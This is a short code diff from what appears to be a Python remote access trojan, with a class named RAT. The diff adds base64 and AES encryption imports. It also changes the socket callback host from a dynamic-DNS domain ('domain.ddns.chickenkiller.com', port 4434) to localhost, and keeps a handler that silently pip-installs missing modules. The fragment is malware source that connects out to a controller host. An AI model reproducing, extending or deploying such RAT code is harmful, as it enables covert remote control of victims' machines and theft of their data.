@@ -113,6 +113,9 @@ try:
 	import socket
 	import getpass
 	import subprocess
+	import base64
+	from Crypto.Cipher import AES
+	from Crypto import Random
 	from RAW import *
 except ImportError as e:
 	pip = lambda : os.system('pip install' + str(e)[15:])
@@ -177,7 +180,7 @@ class RAT:
 		cls._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		# set loopback address
 		#cls._loop = "127.0.0.1" #socket.gethostbyname("localhost")
-		cls._loop = 'domain.ddns.chickenkiller.com'
+		cls._loop = '127.0.0.1'
 		# set new port
 		cls._port = 4434
 		cls._info = cls.build_info()
